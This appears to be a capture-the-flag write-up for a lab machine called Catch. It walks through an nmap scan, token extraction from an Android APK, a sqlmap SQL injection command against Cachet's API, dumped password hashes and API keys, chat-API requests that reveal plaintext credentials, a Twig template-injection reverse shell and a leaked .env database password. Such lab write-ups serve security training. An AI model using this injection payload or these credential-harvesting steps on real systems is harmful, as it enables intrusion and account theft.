## NMAP

```
─$ nmap -sC -sV 10.10.11.150
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-22 14:20 EDT
Stats: 0:01:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 14:22 (0:00:20 remaining)
Stats: 0:02:16 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.56% done; ETC: 14:23 (0:00:00 remaining)
Nmap scan report for catch.htb (10.10.11.150)
Host is up (0.24s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request                                                                                                                                                                                                                               
|   GetRequest:                                                                                                                                                                                                                             
|     HTTP/1.0 200 OK                                                                                                                                                                                                                       
|     Content-Type: text/html; charset=UTF-8                                                                                                                                                                                                
|     Set-Cookie: i_like_gitea=4b651e60fe4a82fd; Path=/; HttpOnly                                                                                                                                                                           
|     Set-Cookie: _csrf=l5Z-g0TNwEjauqAvBbyk9FVcsxU6MTY1MzI0MzY4NzMzMDc0MDYxMw; Path=/; Expires=Mon, 23 May 2022 18:21:27 GMT; HttpOnly; SameSite=Lax                                                                                       
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly                                                                                                                                                                               
|     X-Frame-Options: SAMEORIGIN                                                                                                                                                                                                           
|     Date: Sun, 22 May 2022 18:21:27 GMT                                                                                                                                                                                                   
|     <!DOCTYPE html>                                                                                                                                                                                                                       
|     <html lang="en-US" class="theme-">                                                                                                                                                                                                    
|     <head data-suburl="">                                                                                                                                                                                                                 
|     <meta charset="utf-8">                                                                                                                                                                                                                
|     <meta name="viewport" content="width=device-width, initial-scale=1">                                                                                                                                                                  
|     <meta http-equiv="x-ua-compatible" content="ie=edge">                                                                                                                                                                                 
|     <title> Catch Repositories </title>                                                                                                                                                                                                   
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz                                                                                                                                                                                                                      
|   HTTPOptions:                                                                                                                                                                                                                            
|     HTTP/1.0 405 Method Not Allowed                                                                                                                                                                                                       
|     Set-Cookie: i_like_gitea=d576c2989d0dd9fd; Path=/; HttpOnly                                                                                                                                                                           
|     Set-Cookie: _csrf=JENho4H40rit3iW_IvxT_zyjS-g6MTY1MzI0MzY5MzcwNDg5NTIyMQ; Path=/; Expires=Mon, 23 May 2022 18:21:33 GMT; HttpOnly; SameSite=Lax                                                                                       
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly                                                                                                                                                                               
|     X-Frame-Options: SAMEORIGIN                                                                                                                                                                                                           
|     Date: Sun, 22 May 2022 18:21:33 GMT                                                                                                                                                                                                   
|_    Content-Length: 0                                                                                                                                                                                                                     
5000/tcp open  upnp?                                                                                                                                                                                                                        
| fingerprint-strings:                                                                                                                                                                                                                      
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge:                                                                                                                                     
|     HTTP/1.1 400 Bad Request                                                                                                                                                                                                              
|     Connection: close                                                                                                                                                                                                                     
|   GetRequest:                                                                                                                                                                                                                             
|     HTTP/1.1 302 Found                                                                                                                                                                                                                    
|     X-Frame-Options: SAMEORIGIN                                                                                                                                                                                                           
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy: 
|     X-Content-Security-Policy: 
|     X-WebKit-CSP: 
|     X-UA-Compatible: IE=Edge,chrome=1
|     Location: /login
|     Vary: Accept, Accept-Encoding
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 28
|     Set-Cookie: connect.sid=s%3Ah1dYY0o3yaQ4BPl4D8VmtRH1_pSBVmKx.Td7m1%2Fh%2BOaVQG8rP6YLR8k%2BcSgxX7YrXg%2B4wzTejkD8; Path=/; HttpOnly
|     Date: Sun, 22 May 2022 18:21:31 GMT
|     Connection: close
|     Found. Redirecting to /login
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy: 
|     X-Content-Security-Policy: 
|     X-WebKit-CSP: 
|     X-UA-Compatible: IE=Edge,chrome=1
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Set-Cookie: connect.sid=s%3AyUGkmc3iM_fsSAqPPc8Hh79KyybjhtOm.G2Yy4ts35%2FPYwjw3vXluP6sHjsQmoWjPDahsVeVZh0I; Path=/; HttpOnly
|     Vary: Accept-Encoding
|     Date: Sun, 22 May 2022 18:21:34 GMT
|     Connection: close
|_    GET,HEAD
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.29 (Ubuntu)
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.92%I=7%D=5/22%Time=628A7F25%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,30E3,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20i_like_gitea=4b651e60f
SF:e4a82fd;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=l5Z-g0TNwEjauqA
SF:vBbyk9FVcsxU6MTY1MzI0MzY4NzMzMDc0MDYxMw;\x20Path=/;\x20Expires=Mon,\x20
SF:23\x20May\x202022\x2018:21:27\x20GMT;\x20HttpOnly;\x20SameSite=Lax\r\nS
SF:et-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x20HttpOnly\r\nX
SF:-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2022\x20May\x202022\x20
SF:18:21:27\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20c
SF:lass=\"theme-\">\n<head\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-
SF:8\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20
SF:initial-scale=1\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20conten
SF:t=\"ie=edge\">\n\t<title>\x20Catch\x20Repositories\x20</title>\n\t<link
SF:\x20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjo
SF:iQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcy
SF:IsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W
SF:3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz")%r(Help,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,17F
SF:,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nSet-Cookie:\x20i_like
SF:_gitea=d576c2989d0dd9fd;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf
SF:=JENho4H40rit3iW_IvxT_zyjS-g6MTY1MzI0MzY5MzcwNDg5NTIyMQ;\x20Path=/;\x20
SF:Expires=Mon,\x2023\x20May\x202022\x2018:21:33\x20GMT;\x20HttpOnly;\x20S
SF:ameSite=Lax\r\nSet-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\
SF:x20HttpOnly\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2022\x2
SF:0May\x202022\x2018:21:33\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTS
SF:PRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.92%I=7%D=5/22%Time=628A7F2A%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,242,"HTTP/1\.1\x20302\x20Found\r\nX-Frame-Options:\x20SAMEORIG
SF:IN\r\nX-Download-Options:\x20noopen\r\nX-Content-Type-Options:\x20nosni
SF:ff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nContent-Security-Policy:
SF:\x20\r\nX-Content-Security-Policy:\x20\r\nX-WebKit-CSP:\x20\r\nX-UA-Com
SF:patible:\x20IE=Edge,chrome=1\r\nLocation:\x20/login\r\nVary:\x20Accept,
SF:\x20Accept-Encoding\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nContent-Length:\x2028\r\nSet-Cookie:\x20connect\.sid=s%3Ah1dYY0o3yaQ4B
SF:Pl4D8VmtRH1_pSBVmKx\.Td7m1%2Fh%2BOaVQG8rP6YLR8k%2BcSgxX7YrXg%2B4wzTejkD
SF:8;\x20Path=/;\x20HttpOnly\r\nDate:\x20Sun,\x2022\x20May\x202022\x2018:2
SF:1:31\x20GMT\r\nConnection:\x20close\r\n\r\nFound\.\x20Redirecting\x20to
SF:\x20/login")%r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:nnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(SMBProgNeg,2F,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(
SF:ZendJavaBridge,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(HTTPOptions,243,"HTTP/1\.1\x20200\x20OK\r\nX-Frame-O
SF:ptions:\x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\nX-Content-Typ
SF:e-Options:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nConte
SF:nt-Security-Policy:\x20\r\nX-Content-Security-Policy:\x20\r\nX-WebKit-C
SF:SP:\x20\r\nX-UA-Compatible:\x20IE=Edge,chrome=1\r\nAllow:\x20GET,HEAD\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x208\
SF:r\nETag:\x20W/\"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\"\r\nSet-Cookie:\x20conne
SF:ct\.sid=s%3AyUGkmc3iM_fsSAqPPc8Hh79KyybjhtOm\.G2Yy4ts35%2FPYwjw3vXluP6s
SF:HjsQmoWjPDahsVeVZh0I;\x20Path=/;\x20HttpOnly\r\nVary:\x20Accept-Encodin
SF:g\r\nDate:\x20Sun,\x2022\x20May\x202022\x2018:21:34\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\nGET,HEAD")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nConnection:\x20close\r\n\r\n")%r(DNSStatusRequestTCP,2F,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(He
SF:lp,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r
SF:\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.26 seconds
```

Now go to `http://10.10.11.150`
![indexpng](https://user-images.githubusercontent.com/8396956/169710789-b8c11781-2b81-4d25-8645-0579c1c85f4f.png)

Download the APK file and analyze using MobSF , We will find Domain and three tokens

Domain: status.catch.htb
![Domain](https://user-images.githubusercontent.com/8396956/169710918-47952ced-2479-4049-b9e0-24845f708ab9.png)

Three Tokens:
![Tokens](https://user-images.githubusercontent.com/8396956/169710987-5331fa58-2510-4736-8143-09ae736c0fb4.png)

Add `status.catch.htb` to `/etc/hostd` , go to `http://status.catch.htb:8000`

![cachetAuth](https://user-images.githubusercontent.com/8396956/169711396-b9b3806a-5722-43e0-bb3d-f2ead3257cb6.png)

We notice `cachet` 

By searching for vulnerabilities for cachet i got [Cachet Exploitation](https://144.one/cachet-2318qian-tai-sqlzhu-ru.html) 

following this 

 `sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1000000&1[0]=a&1[1]==&1[2]=1000000&1[3]= and name=?) *%23" --technique=B --level=5`

By dumping the database and users table , we got `API keys and user (john , admin)`

```
┌──(mido㉿kali)-[~/…/output/status.catch.htb/dump/cachet]
└─$ cat users.csv
id,email,active,level,api_key,password,username,welcomed,created_at,updated_at,remember_token,google_2fa_secret
1,admin@catch.htb,1,1,rMSN8kJN9TPADl2cWv8N,$2y$10$quY5ttamPWVo54lbyLSWEu00A/tkMlqoFaEKwJSWPVGHpVK2Wj7Om,admin,1,2022-03-03 02:51:26,2022-03-03 02:51:35,5t3PCyAurH7oKann9dhMfL7t0ZTN7bz4yiASDB8EAfkAOcN60yx0YTfBBlPj,NULL
2,john@catch.htb,1,2,7GVCqTY5abrox48Nct8j,$2y$10$2jcDURPAEbv2EEKto0ANb.jcjgiAwWzkwzZKNT9fUpOziGjJy5r8e,john,1,2022-03-03 02:51:57,2022-03-03 02:52:12,5N58LraMhWCeM6kVL1OgADG4DoUkViSmJLowCth6ocSLv9s7DyDmNWgYEJlB,NULL
```

Trying to crack the password using `John the Ripper password cracker` but no result 

let's go to `http://10.10.11.150:5000`

![let'schat](https://user-images.githubusercontent.com/8396956/169711862-f44cf482-fa68-4681-8542-319bebdc7535.png)

By reading about `let's chat` from [API Authentication](https://github.com/sdelements/lets-chat/wiki/API:-Authentication).

```
Bearer Token Authentication
Use the API token as the Bearer token.
```

```
└─$   curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" -i   http://10.10.11.150:5000/rooms

HTTP/1.1 200 OK
X-Frame-Options: SAMEORIGIN
X-Download-Options: noopen
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: 
X-Content-Security-Policy: 
X-WebKit-CSP: 
X-UA-Compatible: IE=Edge,chrome=1
Content-Type: application/json; charset=utf-8
Content-Length: 860
ETag: W/"35c-aAImKzSV1mWHmtGLu5/YkMt+2hk"
Set-Cookie: connect.sid=s%3A2nj_pTpVTXsMueHjzl8ZFQ-k3Vc72Bad.bLtFL8u6o5WnbHQ1vUrVIhIfAorSUhBtJerYSCJh8XY; Path=/; HttpOnly
Vary: Accept-Encoding
Date: Sun, 22 May 2022 19:14:52 GMT
Connection: keep-alive

[{"id":"61b86b28d984e2451036eb17","slug":"status","name":"Status","description":"Cachet Updates and Maintenance","lastActive":"2021-12-14T10:34:20.749Z","created":"2021-12-14T10:00:08.384Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]},{"id":"61b8708efe190b466d476bfb","slug":"android_dev","name":"Android Development","description":"Android App Updates, Issues & More","lastActive":"2021-12-14T10:24:21.145Z","created":"2021-12-14T10:23:10.474Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]},{"id":"61b86b3fd984e2451036eb18","slug":"employees","name":"Employees","description":"New Joinees, Org updates","lastActive":"2021-12-14T10:18:04.710Z","created":"2021-12-14T10:00:31.043Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]}]
```


using the room id to open the messages it contains

```
└─$  curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" -i   http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages
HTTP/1.1 200 OK
X-Frame-Options: SAMEORIGIN
X-Download-Options: noopen
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: 
X-Content-Security-Policy: 
X-WebKit-CSP: 
X-UA-Compatible: IE=Edge,chrome=1
Content-Type: application/json; charset=utf-8
Content-Length: 2014
ETag: W/"7de-G7OZAcMzWuoZBQCFNVQ+lgsTGTA"
Set-Cookie: connect.sid=s%3Ae2Z70VNMYLoppO7CouLoct1r9_I0M1Ac.M3Vbz63cR4rqWcX2bzzPvyN7nFs2%2FyHo2KSqPiLluVM; Path=/; HttpOnly
Vary: Accept-Encoding
Date: Sun, 22 May 2022 19:16:15 GMT
Connection: keep-alive

[{"id":"61b8732cfe190b466d476c02","text":"ah sure!","posted":"2021-12-14T10:34:20.749Z","owner":"61b86dbdfe190b466d476bf0","room":"61b86b28d984e2451036eb17"},{"id":"61b8731ffe190b466d476c01","text":"You should actually include this task to your list as well as a part of quarterly audit","posted":"2021-12-14T10:34:07.449Z","owner":"61b86aead984e2451036eb16","room":"61b86b28d984e2451036eb17"},{"id":"61b872b9fe190b466d476c00","text":"Also make sure we've our systems, applications and databases up-to-date.","posted":"2021-12-14T10:32:25.514Z","owner":"61b86dbdfe190b466d476bf0","room":"61b86b28d984e2451036eb17"},{"id":"61b87282fe190b466d476bff","text":"Excellent! ","posted":"2021-12-14T10:31:30.403Z","owner":"61b86aead984e2451036eb16","room":"61b86b28d984e2451036eb17"},{"id":"61b87277fe190b466d476bfe","text":"Why not. We've this in our todo list for next quarter","posted":"2021-12-14T10:31:19.094Z","owner":"61b86dbdfe190b466d476bf0","room":"61b86b28d984e2451036eb17"},{"id":"61b87241fe190b466d476bfd","text":"@john is it possible to add SSL to our status domain to make sure everything is secure ? ","posted":"2021-12-14T10:30:25.108Z","owner":"61b86aead984e2451036eb16","room":"61b86b28d984e2451036eb17"},{"id":"61b8702dfe190b466d476bfa","text":"Here are the credentials `john :  E}V!mywu_69T4C}W`","posted":"2021-12-14T10:21:33.859Z","owner":"61b86f15fe190b466d476bf5","room":"61b86b28d984e2451036eb17"},{"id":"61b87010fe190b466d476bf9","text":"Sure one sec.","posted":"2021-12-14T10:21:04.635Z","owner":"61b86f15fe190b466d476bf5","room":"61b86b28d984e2451036eb17"},{"id":"61b86fb1fe190b466d476bf8","text":"Can you create an account for me ? ","posted":"2021-12-14T10:19:29.677Z","owner":"61b86dbdfe190b466d476bf0","room":"61b86b28d984e2451036eb17"},{"id":"61b86f4dfe190b466d476bf6","text":"Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. ","posted":"2021-12-14T10:17:49.761Z","owner":"61b86f15fe190b466d476bf5","room":"61b86b28d984e2451036eb17"}]                        
```

we find  `john : E}V!mywu_69T4C}W`

login into cachet using the creds

![dashroad](https://user-images.githubusercontent.com/8396956/169713387-3e9270fe-5498-48fb-9d19-7977ff5477a6.png)


Now let's try to reverse shell by creating INCIDENT TEMPLATE

![Twig](https://user-images.githubusercontent.com/8396956/169713463-0210b931-09dc-4f87-89af-fa55d69672bb.png)

We notice it's using Twig Template language  , SEARCH for `SSTI` with `twig`

[SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php)

![payload](https://user-images.githubusercontent.com/8396956/169714064-a4a58ee4-1d66-45f3-aeee-1df29cea5a7a.png)


We got shell

analyze `env` 

```
$ cat .env
APP_ENV=production
APP_DEBUG=false
APP_URL=http://localhost
APP_TIMEZONE=UTC
APP_KEY=base64:9mUxJeOqzwJdByidmxhbJaa74xh3ObD79OI6oG1KgyA=
DEBUGBAR_ENABLED=false

DB_DRIVER=mysql
DB_HOST=localhost
DB_UNIX_SOCKET=null
DB_DATABASE=cachet
DB_USERNAME=will
DB_PASSWORD=s2#4Fg0_%3!
DB_PORT=null
DB_PREFIX=null

CACHE_DRIVER=file
SESSION_DRIVER=database
QUEUE_DRIVER=null

CACHET_BEACON=true
CACHET_EMOJI=false
CACHET_AUTO_TWITTER=true

MAIL_DRIVER=smtp
MAIL_HOST=
MAIL_PORT=null
MAIL_USERNAME=
MAIL_PASSWORD=
MAIL_ADDRESS=notify@10.129.136.74
MAIL_NAME=null
MAIL_ENCRYPTION=tls

REDIS_HOST=null
REDIS_DATABASE=null
REDIS_PORT=null

GITHUB_TOKEN=null

NEXMO_KEY=null
NEXMO_SECRET=null
NEXMO_SMS_FROM=Cachet

TRUSTED_PROXIES=
``` 

We got `will:s2#4Fg0_%3!`
